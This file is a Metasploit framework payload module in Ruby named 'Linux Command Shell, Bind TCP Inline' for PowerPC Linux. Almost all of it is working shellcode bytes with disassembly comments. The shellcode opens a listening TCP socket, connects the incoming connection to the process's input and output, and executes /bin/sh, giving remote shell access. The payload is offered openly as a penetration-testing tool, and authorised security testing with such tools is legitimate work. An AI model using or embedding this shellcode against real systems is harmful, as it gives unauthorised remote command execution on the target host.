##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 223

  include Msf::Payload::Single
  include Msf::Payload::Linux::Ppc::Prepends
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => [ ARCH_PPC, ARCH_CBEA ],
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 58, 'n' ],
            },
          'Payload' =>
            "\x7f\xff\xfa\x78"     + #   xor     r31,r31,r31                #
            "\x3b\xa0\x01\xff"     + #   li      r29,511                    #
            "\x3b\x9d\xfe\x02"     + #   addi    r28,r29,-510               #
            "\x3b\x7d\xfe\x03"     + #   addi    r27,r29,-509               #
            "\x97\xe1\xff\xfc"     + #   stwu    r31,-4(r1)                 #
            "\x97\x81\xff\xfc"     + #   stwu    r28,-4(r1)                 #
            "\x97\x61\xff\xfc"     + #   stwu    r27,-4(r1)                 #
            "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
            "\x38\x7d\xfe\x02"     + #   addi    r3,r29,-510                #
            "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "\x7c\x7a\x1b\x78"     + #   mr      r26,r3                     #
            "\x3b\x3d\xfe\x11"     + #   addi    r25,r29,-495               #
            "\x3e\xe0\xff\x02"     + #   lis     r23,-254                   #
            "\x62\xf7\x04\xd2"     + #   ori     r23,r23,1234               #
            "\x97\xe1\xff\xfc"     + #   stwu    r31,-4(r1)                 #
            "\x96\xe1\xff\xfc"     + #   stwu    r23,-4(r1)                 #
            "\x7c\x36\x0b\x78"     + #   mr      r22,r1                     #
            "\x97\x21\xff\xfc"     + #   stwu    r25,-4(r1)                 #
            "\x96\xc1\xff\xfc"     + #   stwu    r22,-4(r1)                 #
            "\x97\x41\xff\xfc"     + #   stwu    r26,-4(r1)                 #
            "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
            "\x38\x7d\xfe\x03"     + #   addi    r3,r29,-509                #
            "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "\x97\xe1\xff\xfc"     + #   stwu    r31,-4(r1)                 #
            "\x97\xe1\xff\xfc"     + #   stwu    r31,-4(r1)                 #
            "\x97\x41\xff\xfc"     + #   stwu    r26,-4(r1)                 #
            "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
            "\x38\x7d\xfe\x05"     + #   addi    r3,r29,-507                #
            "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
            "\x38\x7d\xfe\x06"     + #   addi    r3,r29,-506                #
            "\x38\x1d\xfe\x67"     + #   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "\x7c\x75\x1b\x78"     + #   mr      r21,r3                     #
            "\x7f\x64\xdb\x78"     + #   mr      r4,r27                     #
            "\x7e\xa3\xab\x78"     + #   mr      r3,r21                     #
            "\x38\x1d\xfe\x40"     + #   addi    r0,r29,-448                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "\x37\x7b\xff\xff"     + #   addic.  r27,r27,-1                 #
            "\x40\x80\xff\xec"     + #   bge+    <bndsockcode+148>          #
            "\x7c\xa5\x2a\x79"     + #   xor.    r5,r5,r5                   #
            "\x40\x82\xff\xfd"     + #   bnel+   <bndsockcode+172>          #
            "\x7f\xc8\x02\xa6"     + #   mflr    r30                        #
            "\x3b\xde\x01\xff"     + #   addi    r30,r30,511                #
            "\x38\x7e\xfe\x25"     + #   addi    r3,r30,-475                #
            "\x98\xbe\xfe\x2c"     + #   stb     r5,-468(r30)               #
            "\x94\xa1\xff\xfc"     + #   stwu    r5,-4(r1)                  #
            "\x94\x61\xff\xfc"     + #   stwu    r3,-4(r1)                  #
            "\x7c\x24\x0b\x78"     + #   mr      r4,r1                      #
            "\x38\x1d\xfe\x0c"     + #   addi    r0,r29,-500                #
            "\x44\xff\xff\x02"     + #   sc                                 #
            "/bin/sh"
        }
      ))
  end
end
